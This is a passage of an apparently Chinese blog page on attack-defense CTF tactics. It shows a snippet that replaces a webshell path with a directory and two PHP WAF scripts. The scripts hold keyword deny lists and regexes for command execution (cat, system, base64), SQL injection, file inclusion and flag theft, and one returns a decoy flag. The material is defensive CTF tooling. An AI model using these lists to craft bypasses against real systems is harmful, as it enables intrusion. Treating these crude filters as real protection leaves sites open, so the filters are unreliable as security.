#89DDFF\">&quot;</span><span style=\"color: #C3E88D\">/var/www/html/.shell.php/</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">file</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">/var/www/html/.shell.php</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">rm</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-rf</span><span style=\"color: #BABED8\"> $file</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">mkdir</span><span style=\"color: #BABED8\"> $dire</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">./xx.sh</span></span></code></pre></div><h2 id=\"WAF\"><a href=\"#WAF\" class=\"headerlink\" title=\"WAF\"></a>WAF</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #BABED8\">php</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">$request</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]</span><span style=\"color: #BABED8\"> = $_SERVER</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">REQUEST_URI</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">$request</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">time</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]</span><span style=\"color: #BABED8\"> = date</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">&#39;Y-m-d H:i:s&#39;</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">if</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$_POST</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    foreach</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$_POST as $k =</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> $v</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        $request[$k]=urldecode($v)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">$file </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">fopen</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">&#39;waf.log&#39;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #FFCB6B\">&#39;a&#39;</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">fwrite($file,json_encode($request</span><span style=\"color: #BABED8\">) </span><span style=\"color: #82AAFF\">.</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">\\n</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">fclose($file</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">foreach</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$_POST as $key =</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> $value</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">waf($value</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">f</span><span style=\"color: #FFCB6B\">oreach($_GET</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">as</span><span style=\"color: #BABED8\"> $key =</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> $value)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">waf($value</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C792EA\">function</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">waf</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$str</span><span style=\"color: #89DDFF\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    $filed=</span><span style=\"color: #FFCB6B\">&#39;flag|cat|less|nl|more|tac|tail|base64|system&#39;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    if</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">preg_match(</span><span style=\"color: #FFCB6B\">&quot;/</span><span style=\"color: #BABED8\">$filed</span><span style=\"color: #FFCB6B\">/im&quot;</span><span style=\"color: #FFCB6B\">,$str</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #82AAFF\">exit</span><span style=\"color: #BABED8\">(</span><span style=\"color: #FFCB6B\">&#39;flag&#123;asdfaqawfawfawf&#125;&#39;</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">&#125;</span></span></code></pre></div><h3 id=\"通常WAF\"><a href=\"#通常WAF\" class=\"headerlink\" title=\"通常WAF\"></a>通常WAF</h3><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #BABED8\">php</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">date_default_timezone_set(</span><span style=\"color: #FFCB6B\">&quot;PRC&quot;</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">//这块在开始的代码没有的，我加的。不加就会报错。</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">//error_reporting(E_ALL</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">//ini_set(</span><span style=\"color: #FFCB6B\">&#39;display_errors&#39;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">1</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">/*</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">**</span><span style=\"color: #BABED8\"> 线下攻防php版本waf</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">**</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">**</span><span style=\"color: #BABED8\"> Author: 落</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\">/</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">/*</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">检测请求方式，除了get和post之外拦截下来并写日志。</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\">/</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">if</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$_SERVER</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">REQUEST_METHOD</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">!</span><span style=\"color: #BABED8\">= </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">POST</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&amp;&amp;</span><span style=\"color: #BABED8\"> $_SERVER[</span><span style=\"color: #FFCB6B\">&#39;REQUEST_METHOD&#39;</span><span style=\"color: #FFCB6B\">]</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">!=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">GET</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">write_attack_log(</span><span style=\"color: #FFCB6B\">&quot;method&quot;</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">$url </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> $_SERVER</span><span style=\"color: #C3E88D\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">REQUEST_URI</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">]</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">//获取url来进行检测</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">$data = file_get_contents</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">&#39;php://input&#39;</span><span style=\"color: #89DDFF\">);</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">//获取post的data，无论是否是mutipart</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">$headers = </span><span style=\"color: #82AAFF\">get_all_headers</span><span style=\"color: #89DDFF\">();</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">//获取header</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">filter_attack_keyword(filter_invisible(urldecode(filter_0x25($url</span><span style=\"color: #BABED8\">))))</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">//对URL进行检测，出现问题则拦截并记录</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">filter_attack_keyword(filter_invisible(urldecode(filter_0x25($data</span><span style=\"color: #BABED8\">))))</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">//对POST的内容进行检测，出现问题拦截并记录</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">/*</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">检测过了则对输入进行简单过滤</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\">/</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">foreach</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$_GET as $key =</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> $value</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    $_GET[$key] </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">filter_dangerous_words</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$value</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">foreach</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$_POST as $key =</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> $value</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    $_POST[$key] </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">filter_dangerous_words</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$value</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">foreach</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$headers as $key =</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> $value</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">filter_attack_keyword(filter_invisible(urldecode(filter_0x25($value</span><span style=\"color: #BABED8\">))))</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">//对http请求头进行检测，出现问题拦截并记录</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    $_SERVER[$key] </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">filter_dangerous_words</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$value</span><span style=\"color: #89DDFF\">);</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">//简单过滤</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">/*</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">获取http请求头并写入数组</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\">/</span></span>\n<span class=\"line\"><span style=\"color: #C792EA\">function</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">get_all_headers</span><span style=\"color: #89DDFF\">()</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    $headers </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">array</span><span style=\"color: #89DDFF\">();</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    foreach</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$_SERVER as $key =</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> $value</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        if</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">substr($key,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">5</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> === </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">HTTP_</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">) </span><span style=\"color: #89DDFF\">&#123;</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            $headers[$key] </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> $value</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&#125;</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> $headers</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">/*</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\">/</span></span>\n<span class=\"line\"><span style=\"color: #C792EA\">function</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">filter_invisible</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$str</span><span style=\"color: #89DDFF\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    for</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$i=0</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">$i</span><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">strlen</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$str</span><span style=\"color: #89DDFF\">);</span><span style=\"color: #BABED8\">$i++</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        $ascii </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ord</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$str</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #BABED8\">$i</span><span style=\"color: #89DDFF\">]);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        if</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$ascii</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">126 </span><span style=\"color: #89DDFF\">||</span><span style=\"color: #BABED8\"> $ascii </span><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">32</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">&#123; </span><span style=\"color: #FFCB6B\">//有中文这里要修改</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            if</span><span style=\"color: #89DDFF\">(!</span><span style=\"color: #FFCB6B\">in_array($ascii,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">array</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">9,10,13</span><span style=\"color: #89DDFF\">))</span><span style=\"color: #BABED8\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #FFCB6B\">write_attack_log(</span><span style=\"color: #FFCB6B\">&quot;interrupt&quot;</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF\">&#125;</span><span style=\"color: #BABED8\">else&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                $str </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">str_replace</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">$ascii, </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\">, $str</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    $str </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">str_replace</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">array(</span><span style=\"color: #FFCB6B\">&quot;</span><span style=\"color: #89DDFF\">`</span><span style=\"color: #FFCB6B\">&quot;,&quot;</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">&quot;,&quot;</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #FFCB6B\">&quot;,&quot;,&quot;), &quot;</span><span style=\"color: #C3E88D\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">, </span><span style=\"color: #BABED8\">$str</span><span style=\"color: #C3E88D\">);</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    return </span><span style=\"color: #BABED8\">$str</span><span style=\"color: #C3E88D\">;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">/*</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">*/</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">function filter_0x25(</span><span style=\"color: #BABED8\">$str</span><span style=\"color: #C3E88D\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    if(strpos(</span><span style=\"color: #BABED8\">$str</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">%25</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">) !== false)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">        </span><span style=\"color: #BABED8\">$str</span><span style=\"color: #C3E88D\"> = str_replace(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">%25</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">, </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">%</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">, </span><span style=\"color: #BABED8\">$str</span><span style=\"color: #C3E88D\">);</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">        return filter_0x25(</span><span style=\"color: #BABED8\">$str</span><span style=\"color: #C3E88D\">);</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    &#125;else&#123;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">        return </span><span style=\"color: #BABED8\">$str</span><span style=\"color: #C3E88D\">;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">/*</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\\b</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">*/</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">function filter_attack_keyword(</span><span style=\"color: #BABED8\">$str</span><span style=\"color: #C3E88D\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    if(preg_match(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">/select</span><span style=\"color: #BABED8\">\\b</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">insert\\b</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">update\\b</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">drop\\b</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">delete\\b</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">dumpfile\\b</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">outfile\\b</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">load_file</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">rename\\b</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">floor\\(</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">extractvalue</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">updatexml</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">name_const</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">multipoint\\(/i&quot;, </span><span style=\"color: #BABED8\">$str</span><span style=\"color: #FFCB6B\">))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">        write_attack_log(&quot;sqli&quot;);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    //此处文件包含的检测我真的不会写了，求高人指点。。。</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    if(substr_count(</span><span style=\"color: #BABED8\">$str</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #BABED8\">$_SERVER</span><span style=\"color: #FFCB6B\">[&#39;PHP_SELF&#39;]) &lt; 2)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">        </span><span style=\"color: #BABED8\">$tmp</span><span style=\"color: #FFCB6B\"> = str_replace(</span><span style=\"color: #BABED8\">$_SERVER</span><span style=\"color: #FFCB6B\">[&#39;PHP_SELF&#39;], &quot;&quot;, </span><span style=\"color: #BABED8\">$str</span><span style=\"color: #FFCB6B\">);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">        if(preg_match(&quot;/\\.\\.</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #82AAFF\">.</span><span style=\"color: #C3E88D\">*\\.php[35]&#123;0,1&#125;</span><span style=\"color: #FFCB6B\">/i&quot;, </span><span style=\"color: #BABED8\">$tmp</span><span style=\"color: #FFCB6B\">))&#123; </span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">            write_attack_log(&quot;LFI/LFR&quot;);;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    &#125;else&#123;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">        write_attack_log(&quot;LFI/LFR&quot;);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    if(preg_match(&quot;/base64_decode</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #82AAFF\">eval</span><span style=\"color: #C3E88D\">\\(</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\">assert\\(/i&quot;, </span><span style=\"color: #BABED8\">$str</span><span style=\"color: #FFCB6B\">))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">        write_attack_log(&quot;EXEC&quot;);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    if(preg_match(&quot;/flag/i&quot;, </span><span style=\"color: #BABED8\">$str</span><span style=\"color: #FFCB6B\">))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">        write_attack_log(&quot;GETFLAG&quot;);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">/*</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">简单将易出现问题的字符替换成中文</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">*/</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">function filter_dangerous_words(</span><span style=\"color: #BABED8\">$str</span><span style=\"color: #FFCB6B\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    </span><span style=\"color: #BABED8\">$str</span><span 